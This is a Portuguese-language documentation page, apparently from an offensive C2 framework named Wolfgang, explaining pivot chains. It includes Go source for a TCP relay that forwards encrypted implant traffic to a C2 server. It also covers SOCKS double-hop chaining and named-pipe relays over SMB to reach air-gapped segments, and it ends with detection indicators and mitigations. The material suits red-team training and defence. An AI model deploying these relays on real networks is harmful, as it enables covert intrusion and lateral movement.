    Pivot Chains¶

    O que é¶

    Pivot chains combinam SOCKS proxies, port forwards e pivot relays para alcançar redes profundamente segmentadas. Quando o alvo final está a múltiplos saltos de distância do operador, cada implant intermediário age como um relay, encaminhando tráfego cifrado para o próximo hop.

    O módulo pivot do Wolfgang implementa um TCP relay dedicado: aceita conexões de implants internos e as encaminha para o C2 server (ou o próximo pivot na cadeia). Os envelopes são opacos -- o pivot não descriptografa nem inspeciona o conteúdo.

    Por que funciona¶

    Redes corporativas são tipicamente segmentadas em camadas:

    • DMZ: Acessível da internet, mas isolada da rede interna
    • Rede corporativa: Estações de trabalho e servidores de aplicação
    • Rede restrita: Databases, domain controllers, sistemas críticos
    • Rede air-gapped: Sistemas completamente isolados (OT, SCADA)

    Um implant na DMZ não alcança a rede restrita. Mas um implant na rede corporativa pode alcançar ambos. Encadeando pivots, o operador pode atravessar cada fronteira de segmentação.

    O pivot funciona porque:

    • Cada hop vê apenas tráfego TCP genérico entre dois hosts autorizados
    • O conteúdo é cifrado end-to-end (o pivot não precisa descriptografar)
    • O padrão de tráfego é indistinguível de comunicação legítima entre servidores

    Implementação no Wolfgang¶

    O módulo pivot (pkg/module/lateral/pivot.go) implementa um TCP relay puro e stateful.

    Estrutura¶

    type PivotModule struct {
    mu        sync.Mutex
    pivots    map[string]*pivotState
    connGroup sync.WaitGroup
}

type pivotState struct {
    listener  net.Listener
    stopCh    chan struct{}
    upstream  string // endereço do C2 ou próximo pivot
    conns     []net.Conn
    connMu    sync.Mutex
    connCount int
}

    Start: Criar um pivot relay¶

    O pivot escuta em 0.0.0.0 por padrão (diferente do port forwarding que usa 127.0.0.1), pois implants internos na rede precisam alcançar o listener:

    func (m *PivotModule) start(args module.ModuleArgs) (module.ModuleResult, error) {
    listenPort := args.Parsed["listen_port"]
    upstream := args.Parsed["upstream"]

    // Default 0.0.0.0 para acessibilidade de outros hosts
    listenAddr := "0.0.0.0"
    if a, ok := args.Parsed["listen_addr"]; ok && a != "" {
        listenAddr = a
    }

    ln, _ := net.Listen("tcp", bindAddr)

    state := &pivotState{
        listener: ln,
        stopCh:   make(chan struct{}),
        upstream: upstream,
    }
    // ...
    go m.acceptLoop(state)
}

    Relay bidirecional¶

    Cada conexão downstream (de um implant interno) é pareada com uma conexão upstream (para o C2 ou próximo pivot). Bytes são copiados bidirecionalmente sem inspeção:

    func (m *PivotModule) relayConn(state *pivotState, downConn net.Conn) {
    defer downConn.Close()

    upConn, _ := net.DialTimeout("tcp", state.upstream, pivotDialTimeout)
    defer upConn.Close()

    done := make(chan struct{}, 2)

    // downstream → upstream (agent → server)
    go func() {
        io.Copy(upConn, downConn)
        if tc, ok := upConn.(*net.TCPConn); ok {
            tc.CloseWrite()
        }
        done <- struct{}{}
    }()

    // upstream → downstream (server → agent)
    go func() {
        io.Copy(downConn, upConn)
        if tc, ok := downConn.(*net.TCPConn); ok {
            tc.CloseWrite()
        }
        done <- struct{}{}
    }()

    // Espera ambos ou sinal de stop
    select {
    case <-state.stopCh:
    case <-done:
        select {
        case <-state.stopCh:
        case <-done:
        }
    }
}

    Diferença entre Pivot e Port Forward¶

    Aspecto Port Forward Pivot Relay
    Direção Operador → alvo Implant interno → C2
    Listen address 127.0.0.1 0.0.0.0
    Propósito Acessar serviço remoto Rotear tráfego C2
    Conteúdo Protocolo do serviço (RDP, SSH) Envelopes cifrados do C2

    Combinando SOCKS + Pivot¶

    O cenário mais poderoso combina SOCKS proxy com pivot relay:

    1. Implant A (DMZ) roda SOCKS proxy para o operador
    2. Implant A também roda pivot relay para implants internos
    3. Implant B (corporativa) conecta ao pivot de A para comunicação C2
    4. Implant B roda SOCKS proxy (via A) para que o operador alcance a rede corporativa
    Operador → SOCKS5(A) → rede interna      (acesso dinâmico via A)
Implant B → pivot(A) → C2 server          (controle de B via relay de A)
Operador → SOCKS5(A) → SOCKS5(B) → rede restrita  (double-hop)

    Named Pipe Relay (Air-gapped)¶

    Para redes verdadeiramente air-gapped (sem conectividade IP), o pivot pode usar named pipes em vez de TCP. O named pipe viaja sobre SMB (porta 445), que frequentemente é permitido entre segmentos para file sharing.

    Fluxo conceitual:

    Implant (air-gapped) → named pipe → pivot (rede corp) → TCP → C2

    O pivot traduz entre named pipe (IPC local/SMB) e TCP (C2 channel).

    Detecção¶

    IOC Descrição
    Host com listener TCP + múltiplas conexões bidirecionais Padrão de relay
    Tráfego cifrado entre hosts internos Comunicação C2 encadeada
    Host intermediário com conexão persistente para internet + conexões de hosts internos Padrão de pivot
    Volume de dados simétrico em ambas as direções Relay bidirecional (não é web browsing)

    Mitigações:

    • Microsegmentação: Restringir comunicação entre VLANs ao mínimo necessário
    • East-west monitoring: Monitorar tráfego entre hosts internos, não apenas north-south
    • Network anomaly detection: Detectar padrões de relay (host A se comunicando com B e C simultaneamente com volume simétrico)
    • Zero Trust: Autenticação mútua entre serviços, não apenas entre perímetros
